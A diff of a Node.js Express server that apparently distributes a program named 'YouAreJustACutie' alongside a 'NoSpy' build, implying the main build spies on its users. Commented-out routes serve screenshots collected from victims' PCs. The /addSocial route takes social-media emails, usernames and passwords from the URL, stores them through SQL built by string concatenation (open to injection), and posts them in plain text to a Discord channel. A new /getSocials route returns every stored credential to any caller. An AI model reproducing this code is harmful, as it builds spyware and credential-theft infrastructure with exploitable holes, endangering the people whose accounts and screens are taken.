@@ -76,202 +76,169 @@ app.get('/', (req, res) => {
         `);
     });
     
-    // Route pour gérer l'upload des images
-    app.post('/upload', upload.array('images', 10), (req, res) => {
-        if (!req.files || req.files.length === 0) {
-            return res.status(400).send('No files uploaded.');
-        }
-        
-        const fileLinks = req.files.map(file => `<a href="/public/${file.filename}">${file.originalname}</a>`).join('<br>');
-        res.send(`Files uploaded successfully:<br>${fileLinks}`);
-    });
+// Route pour gérer l'upload des images
+app.post('/upload', upload.array('images', 10), (req, res) => {
+    if (!req.files || req.files.length === 0) {
+        return res.status(400).send('No files uploaded.');
+    }
     
+    const fileLinks = req.files.map(file => `<a href="/public/${file.filename}">${file.originalname}</a>`).join('<br>');
+    res.send(`Files uploaded successfully:<br>${fileLinks}`);
+});
+
+
+
+app.get('/downloadBaiBaii', (req, res) => {
+    res.download("build/BaiBai.zip");
+});
+
+
+
+
+// Related to Synced Program
+app.get('/downloadSynced', (req, res) => {
+    res.download("build/SyncedCuties.jar");
+});
+
+app.use('/html', express.static('html'));
+
+                    
+                    
+                    
+                    
+// Related to YouAreJustACutie Program
     
+app.get('/download', (req, res) => {
+    res.download("build/YouAreJustACutie.jar");
+});
+
+app.get('/downloadNoSpy', (req, res) => {
+    res.download("build/YouAreJustACutie-NoSpy.jar");
+});
+
+
+
+app.get('/wallpaper', (req, res) => {
+    const files = fs.readdirSync(path.join('public'));
+    const randomFile = files[Math.floor(Math.random() * files.length)];
+    res.redirect(`/images/${randomFile}`);
+});
+
+app.get('/wallpaper/:pack', (req, res) => {
+    if(req.params.pack) {
+        const files = fs.readdirSync(path.join(`public/${req.params.pack}`));
+        if(files.length > 0) {
+            const randomFile = files[Math.floor(Math.random() * files.length)];
+            res.redirect(`/images/${randomFile}`);
+        } else res.status(404).send("Not found");
+    } else res.status(404).send("Not found");
+});
+
+app.get('/getRandomImage', (req, res) => {
+    const files = fs.readdirSync(path.join('public'));
+    const randomFile = files[Math.floor(Math.random() * files.length)];
+    res.send(randomFile);
+});
     
-    app.get('/downloadBaiBaii', (req, res) => {
-        res.download("build/BaiBai.zip");
-    });
-    
-    
-    
-    
-    // Related to Synced Program
-    app.get('/downloadSynced', (req, res) => {
-        res.download("build/SyncedCuties.jar");
-    });
-    
-    app.use('/html', express.static('html'));
-    
-    
-    // // Cooldowns
-    // let dateOfNewPopup = new Date();
-    // let dateOfNewWallpaper = new Date();
-    
-    
-    // // Change next popup cooldown
-    // app.get('/setPopupCooldown/:timeBeforeNext', (req, res) => {
-        //     const [hours, minutes, seconds] = req.params.timeBeforeNext.split(':').map(Number);
-        //     const now = new Date();
-        //     dateOfNewPopup = new Date(now.getTime() + hours * 3600000 + minutes * 60000 + seconds * 1000);
-        //     res.send(`Popup cooldown set for ${hours} hours, ${minutes} minutes, and ${seconds} seconds from now.`);
-        // });
-        
-        
-        // // Change next wallpaper cooldown
-        // app.get('/setWallPaperCooldown/:timeBeforeNext', (req, res) => {
-            //     const [hours, minutes, seconds] = req.params.timeBeforeNext.split(':').map(Number);
-            //     const now = new Date();
-            //     dateOfNewWallpaper = new Date(now.getTime() + hours * 3600000 + minutes * 60000 + seconds * 1000);
-            //     res.send(`WallPaper cooldown set for ${hours} hours, ${minutes} minutes, and ${seconds} seconds from now.`);
-            // });
+    // app.get('/getRandomScreenshot', (req, res) => {
+        //     const folders = fs.readdirSync(path.join('..', 'cuties'));
+        //     let dates = [];
+        //     for(let i=0; i<folders.length; i++) {
+            //         if(folders[i].startsWith(".")) continue;
+            //         let folderStats = fs.statSync("../cuties/" + folders[i]);
+            //         if(folderStats.isDirectory()) dates.push(folders[i]);
+            //     }
             
+            //     const choosenDate = dates[Math.floor(Math.random() * dates.length)];
+            //     const cutiesPCs = fs.readdirSync(path.join('..', 'cuties', choosenDate));
+            //     let randomCutie;
+            //     let choosenCutieScreenShots = [];
             
-            // // Get time remaining before next Popup
-            // app.get('/getPopupCooldown', (req, res) => {
-                //     const now = new Date();
-                //     let diff = dateOfNewPopup - now;
-                //     if (diff < 0) diff = 0;
+            //     do {
+                //         randomCutie = cutiesPCs[Math.floor(Math.random() * cutiesPCs.length)];
+                //         choosenCutieScreenShots = fs.readdirSync(path.join('..', 'cuties', choosenDate, randomCutie, "screenshots"));
+                //     } while(choosenCutieScreenShots.length == 0);
                 
-                //     res.json({ diff });
+                //     const randomScreenshot = choosenCutieScreenShots[Math.floor(Math.random() * choosenCutieScreenShots.length)];
+                
+                //     res.send({ choosenDate: choosenDate, cutie: randomCutie, screenshot: randomScreenshot });
                 // });
                 
-                
-                // // Get time remaining before next Wallpaper
-                // app.get('/getWallpaperCooldown', (req, res) => {
-                    //     const now = new Date();
-                    //     let diff = dateOfNewWallpaper - now;
-                    //     if (diff < 0) diff = 0;
-
-                    //     res.json({ diff });
-                    // });
-                    
-                    
-                    
-                    // app.get('/cooldown', (req, res) => {
-                        //     res.redirect('./html/cooldown/cooldown.html');
-                        // });
-                        
-                        
-                        
-                        
-                        // Related to YouAreJustACutie Program
-                        
-                        app.get('/download', (req, res) => {
-                            res.download("build/YouAreJustACutie.jar");
-                        });
-
-                        app.get('/downloadNoSpy', (req, res) => {
-                            res.download("build/YouAreJustACutie-NoSpy.jar");
-                        });
-                        
-                        
-                        
-                        app.get('/wallpaper', (req, res) => {
-                            const files = fs.readdirSync(path.join('public'));
-                            const randomFile = files[Math.floor(Math.random() * files.length)];
-                            res.redirect(`/images/${randomFile}`);
-                        });
-                        
-                        app.get('/wallpaper/:pack', (req, res) => {
-                            if(req.params.pack) {
-                                const files = fs.readdirSync(path.join(`public/${req.params.pack}`));
-                                if(files.length > 0) {
-                                    const randomFile = files[Math.floor(Math.random() * files.length)];
-                                    res.redirect(`/images/${randomFile}`);
-                                } else res.status(404).send("Not found");
-                            } else res.status(404).send("Not found");
-                        });
-                        
-                        app.get('/getRandomImage', (req, res) => {
-                            const files = fs.readdirSync(path.join('public'));
-                            const randomFile = files[Math.floor(Math.random() * files.length)];
-                            res.send(randomFile);
-                        });
-                        
-                        // app.get('/getRandomScreenshot', (req, res) => {
-                            //     const folders = fs.readdirSync(path.join('..', 'cuties'));
-                            //     let dates = [];
-                            //     for(let i=0; i<folders.length; i++) {
-                                //         if(folders[i].startsWith(".")) continue;
-                                //         let folderStats = fs.statSync("../cuties/" + folders[i]);
-                                //         if(folderStats.isDirectory()) dates.push(folders[i]);
-                                //     }
+app.get('/images/:image', (req, res) => { res.download(path.join('public', req.params.image)); });
+// app.get('/screenshot/:choosenDate/:cutie/:screenshot', (req, res) => { res.download(path.join('..', 'cuties', req.params.choosenDate, req.params.cutie, "screenshots", req.params.screenshot)); });
                                 
-                                //     const choosenDate = dates[Math.floor(Math.random() * dates.length)];
-                                //     const cutiesPCs = fs.readdirSync(path.join('..', 'cuties', choosenDate));
-                                //     let randomCutie;
-                                //     let choosenCutieScreenShots = [];
                                 
-                                //     do {
-                                    //         randomCutie = cutiesPCs[Math.floor(Math.random() * cutiesPCs.length)];
-                                    //         choosenCutieScreenShots = fs.readdirSync(path.join('..', 'cuties', choosenDate, randomCutie, "screenshots"));
-                                    //     } while(choosenCutieScreenShots.length == 0);
-                                    
-                                    //     const randomScreenshot = choosenCutieScreenShots[Math.floor(Math.random() * choosenCutieScreenShots.length)];
-                                    
-                                    //     res.send({ choosenDate: choosenDate, cutie: randomCutie, screenshot: randomScreenshot });
-                                    // });
-                                    
-                                    app.get('/images/:image', (req, res) => { res.download(path.join('public', req.params.image)); });
-                                    // app.get('/screenshot/:choosenDate/:cutie/:screenshot', (req, res) => { res.download(path.join('..', 'cuties', req.params.choosenDate, req.params.cutie, "screenshots", req.params.screenshot)); });
-                                    
-                                    
-                                    app.get('/social/:social', (req, res) => {
-                                        switch(req.params.social) {
-                                            case "Discord":
-                                                res.download("socials/discord.png");
-                                                break;
-                                                case "Facebook":
-                                                    res.download("socials/facebook.png");
-                                                    break;
-                                                    case "Instagram":
-                                                        res.download("socials/instagram.jpg");
-                                                        break;
-                                                        case "Snapchat":
-                                                            res.download("socials/snapchat.jpg");
+app.get('/social/:social', (req, res) => {
+    switch(req.params.social) {
+        case "Discord":
+            res.download("socials/discord.png");
             break;
-            case "Twitter":
-                res.download("socials/twitter.jpg");
-                break;
-                case "Twitch":
-                    res.download("socials/twitch.png");
-                    break;
-                    case "Google":
-                        res.download("socials/google.png");
-                        break;
-                    }
-                });
-                
-                
-                app.get('/addSocial/:social/:email/:username/:password/:discordUsername', (req, res) => {
-                    console.log(req.params);
-                    database.exec(`INSERT INTO accounts (social, email, username, password) VALUES ('${req.params.social}','${req.params.email}','${req.params.username}','${req.params.password}')`, (err) => {
-                        if(err) {
-                            console.error(`Can not insert data : ${err.toString()}`);
-                            return;
-                        } else console.log("Data inserted.");
-                    });
-                    
-                    const accountEmbed = new EmbedBuilder()
-                    .setColor(0x0099FF)
-                    .setTitle('A new account is shared')
-                    .setDescription(`${req.params.discordUsername} shared a new account :3`)
-                    .setThumbnail(`http://cuties.vps.boxtoplay.com:1570/social/${req.params.social}`)
-                    .addFields(
-                        { name: 'Social : ', value: req.params.social },
-		{ name: '\u200B', value: '\u200B' },
-		{ name: 'Username : ', value: req.params.username },
-		{ name: 'Email : ', value: req.params.email},
-        { name: 'Password : ', value: req.params.password}
-	)
-	// .setImage('https://i.imgur.com/AfFp7pu.png')
-	.setTimestamp()
-	.setFooter({ text: 'Thank you cutie ❤' });
+        case "Facebook":
+            res.download("socials/facebook.png");
+            break;
+        case "Instagram":
+            res.download("socials/instagram.jpg");
+            break;
+        case "Snapchat":
+            res.download("socials/snapchat.jpg");
+            break;
+        case "Twitter":
+            res.download("socials/twitter.jpg");
+            break;
+        case "Twitch":
+            res.download("socials/twitch.png");
+            break;
+        case "Google":
+            res.download("socials/google.png");
+            break;
+    }
+});
+
+
+app.get('/addSocial/:social/:email/:username/:password/:discordUsername', (req, res) => {
+    console.log(req.params);
+    database.exec(`INSERT INTO accounts (social, email, username, password, discord_user) VALUES ('${req.params.social}','${req.params.email}','${req.params.username}','${req.params.password}','${req.params.discordUsername}')`, (err) => {
+        if(err) {
+            console.error(`Can not insert data : ${err.toString()}`);
+            return;
+        } else console.log("Data inserted.");
+    });
     
+    const accountEmbed = new EmbedBuilder()
+    .setColor(0x0099FF)
+    .setTitle('A new account is shared')
+    .setDescription(`${req.params.discordUsername} shared a new account :3`)
+    .setThumbnail(`http://cuties.vps.boxtoplay.com:1570/social/${req.params.social}`)
+    .addFields(
+        { name: 'Social : ', value: req.params.social },
+        { name: '\u200B', value: '\u200B' },
+        { name: 'Username : ', value: req.params.username },
+        { name: 'Email : ', value: req.params.email},
+        { name: 'Password : ', value: req.params.password}
+    )
+    // .setImage('https://i.imgur.com/AfFp7pu.png')
+    .setTimestamp()
+    .setFooter({ text: 'Thank you cutie ❤' });
+
     const channel = guild.channels.cache.get('1228365375520116757');
     channel.send({ embeds: [accountEmbed] });
     res.send("Data inserted.");
 });
+
+
+app.get('/getSocials', (req, res) => {
+    database.all("SELECT * FROM accounts", (err, rows) => {
+        if(err) {
+            console.error(`Can not get data : ${err.toString()}`);
+            return;
+        } else {
+            res.send(rows);
+        }
+    });
+});
+
+
+
 
 app.get('/displaySocials', async (req, res) => {
     const phpFile = path.join('showSocials.php');
